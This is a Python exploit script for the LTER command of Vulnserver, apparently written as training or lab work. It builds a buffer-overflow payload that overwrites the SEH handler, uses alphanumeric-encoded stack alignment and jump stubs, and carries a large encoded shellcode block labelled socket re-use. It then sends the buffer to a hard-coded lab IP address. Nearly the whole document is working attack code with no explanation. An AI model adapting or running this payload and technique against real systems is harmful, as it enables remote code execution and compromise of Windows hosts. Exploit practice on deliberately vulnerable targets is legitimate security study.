# Exploit for Vulnserver - LTER - SEH - Socket re-use
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

alignment1  = "\x66\x05\x35\x11"       # ADD AX, 0x1135
alignment1 += "\x04\x79"               # ADD AL, 0x79
alignment1 += "\x50"                   # PUSH EAX
alignment1 += "\x5c"                   # POP ESP
short_jmp   = "\x66\x2d\x13\x7f"       # SUB AX, 0x7f13
short_jmp  += "\x50"                   # PUSH EAX

alignment2  = "\x54"                   # PUSH ESP 
alignment2 += "\x58"                   # POP EAX
alignment2 += "\x2c\x23"               # SUB AL, 0x23
alignment2 += "\x50"                   # PUSH EAX
alignment2 += "\x5c"                   # POP ESP
long_jmp    = "\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2c\x77\x27\x77\x2d"                                          
long_jmp   += "\x79\x78\x26\x79\x2d\x5c\x7f\x21\x7f\x50\x25\x50\x50\x4a\x50\x25"                                          
long_jmp   += "\x2a\x2a\x30\x2a\x2d\x76\x73\x38\x68\x2d\x3c\x65\x79\x21\x2d\x65"                                          
long_jmp   += "\x6b\x5b\x76\x50"

scbuf ="\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2a\x2a\x6f\x7f\x2d"                                          
scbuf+="\x2a\x36\x65\x2d\x2d\x2c\x23\x2c\x7f\x50\x25\x50\x50\x4a\x50\x25"                                          
scbuf+="\x2a\x2a\x30\x2a\x2d\x23\x77\x23\x6f\x2d\x25\x73\x27\x31\x2d\x66"                                          
scbuf+="\x5a\x49\x3c\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x3b"                                          
scbuf+="\x3d\x3c\x62\x2d\x37\x3c\x3e\x2a\x2d\x3e\x34\x33\x22\x50\x25\x50"                                          
scbuf+="\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x29\x32\x61\x4e\x2d\x2a\x6f"                                          
scbuf+="\x70\x49\x2d\x5b\x2d\x6e\x27\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a"                                          
scbuf+="\x30\x2a\x2d\x31\x5c\x5e\x50\x2d\x2a\x2b\x27\x30\x2d\x52\x28\x28"                                          
scbuf+="\x2d\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2a\x4f\x21"                                          
scbuf+="\x6a\x2d\x74\x22\x25\x37\x2d\x36\x3e\x30\x7e\x50\x25\x50\x50\x4a"                                          
scbuf+="\x50\x25\x2a\x2a\x30\x2a\x2d\x32\x32\x61\x60\x2d\x2b\x3c\x7f\x6f"                                          
scbuf+="\x2d\x51\x60\x5f\x2b\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a"                                          
scbuf+="\x2d\x2b\x62\x22\x27\x2d\x2d\x24\x25\x3c\x2d\x56\x27\x66\x4a\x50"                                          
scbuf+="\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x24\x27\x38\x27\x2d"                                          
scbuf+="\x24\x2a\x25\x2c\x2d\x66\x5c\x50\x5a\x50\x25\x50\x50\x4a\x50\x25"                                          
scbuf+="\x2a\x2a\x30\x2a\x2d\x63\x23\x26\x3e\x2d\x7b\x60\x3e\x32\x2d\x62"                                          
scbuf+="\x73\x4b\x3d\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x54"                                          
scbuf+="\x7f\x47\x7f\x2d\x44\x59\x27\x7e\x2d\x37\x67\x50\x41\x50\x25\x50"                                          
scbuf+="\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x32\x6d\x37\x22\x2d\x2a\x6f"                                          
scbuf+="\x22\x62\x2d\x73\x51\x53\x29\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a"                                          
scbuf+="\x30\x2a\x2d\x6f\x2a\x3b\x2b\x2d\x50\x31\x27\x3d\x2d\x5e\x4d\x47"                                          
scbuf+="\x41\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7f\x27\x7f"                                          
scbuf+="\x2a\x2d\x7f\x7b\x3e\x27\x2d\x7f\x70\x31\x25\x50\x25\x50\x50\x4a"                                          
scbuf+="\x50\x25\x2a\x2a\x30\x2a\x2d\x5f\x32\x7f\x67\x2d\x37\x3e\x7f\x60"                                          
scbuf+="\x2d\x62\x3d\x78\x56\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a"                                          
scbuf+="\x2d\x33\x3d\x67\x69\x2d\x30\x33\x79\x6a\x2d\x30\x2b\x5e\x41\x50"                                          
scbuf+="\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x37\x6f\x2d\x31\x2d"                                          
scbuf+="\x7b\x7c\x36\x23\x2d\x7b\x59\x38\x48\x50\x25\x50\x50\x4a\x50\x25"                                          
scbuf+="\x2a\x2a\x30\x2a\x2d\x25\x77\x2d\x6d\x2d\x21\x7b\x2c\x61\x2d\x70"                                          
scbuf+="\x62\x34\x32\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2d"                                          
scbuf+="\x33\x6b\x6f\x2d\x4f\x3b\x6d\x33\x2d\x32\x3b\x6c\x55\x50\x25\x50"                                          
scbuf+="\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x7f\x7a\x28\x62\x2d\x7a\x24"                                          
scbuf+="\x34\x27\x2d\x7e\x7e\x38\x60\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a"                                          
scbuf+="\x30\x2a\x2d\x64\x37\x27\x28\x2d\x7e\x5d\x39\x4b\x2d\x5b\x68\x39"                                          
scbuf+="\x39\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x2a\x35\x78"                                          
scbuf+="\x25\x2d\x3d\x3e\x39\x33\x2d\x70\x5b\x73\x26\x50\x25\x50\x50\x4a"                                          
scbuf+="\x50\x25\x2a\x2a\x30\x2a\x2d\x22\x39\x31\x29\x2d\x2d\x2d\x21\x39"                                          
scbuf+="\x2d\x31\x33\x45\x7a\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a"                                          
scbuf+="\x2d\x30\x7f\x6d\x26\x2d\x23\x66\x70\x23\x2d\x45\x5a\x79\x2d\x50"                                          
scbuf+="\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x6f\x61\x7f\x6e\x2d"                                          
scbuf+="\x61\x2c\x7f\x7d\x2d\x70\x72\x2d\x7d\x50\x25\x50\x50\x4a\x50\x25"                                          
scbuf+="\x2a\x2a\x30\x2a\x2d\x2a\x7f\x30\x38\x2d\x2a\x5f\x3c\x37\x2d\x21"                                          
scbuf+="\x76\x21\x5f\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x37"                                          
scbuf+="\x38\x6a\x22\x2d\x35\x4f\x75\x22\x2d\x54\x28\x65\x50\x50\x25\x50"                                          
scbuf+="\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x3d\x29\x4e\x21\x2d\x79\x60"                                          
scbuf+="\x50\x50\x2d\x44\x23\x21\x3e\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a"                                          
scbuf+="\x30\x2a\x2d\x2d\x3b\x78\x60\x2d\x60\x5f\x4d\x73\x2d\x23\x34\x5f"                                          
scbuf+="\x78\x50\x25\x50\x50\x4a\x50\x25\x2a\x2a\x30\x2a\x2d\x49\x60\x35"                                          
scbuf+="\x65\x2d\x3d\x66\x4f\x28\x2d\x49\x79\x2a\x22\x50"

alignment3      = "\x54"                      # PUSH ESP
alignment3     += "\x58"                      # POP EAX
alignment3     += "\x2c\x54"                  # SUB AL, 0x54
alignment3     += "\x50"                      # PUSH EAX
alignment3     += "\x5c"                      # POP ESP
alignment3     += "\x44"                      # INC ESP

cmd         = "LTER /.:/"
junk1       = "A" * (100-len(alignment3))
junk2       = "B" * 20
junk3       = "B" * (3495-100-20-90-len(scbuf))
junk4       = "C" * (90-len(alignment2+long_jmp)) 
nseh        = "\x54"                   # PUSH ESP
nseh       += "\x58"                   # POP EAX             
nseh       += "\x71\x04"               # JMP +4
seh         = "\x2b\x17\x50\x62"       # 0x6250172b : pop edi # pop ebp # ret in essfunc.dll 

first_jmp  = alignment1 + short_jmp
second_jmp = alignment2 + long_jmp

junk5      = "C" * (5000-len(cmd+junk1+junk2+nseh+seh+first_jmp+second_jmp+junk3+junk4))

buffer = cmd + junk1 + alignment3 + junk2 + scbuf + junk3 + second_jmp + junk4 + nseh + seh + first_jmp + junk5

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
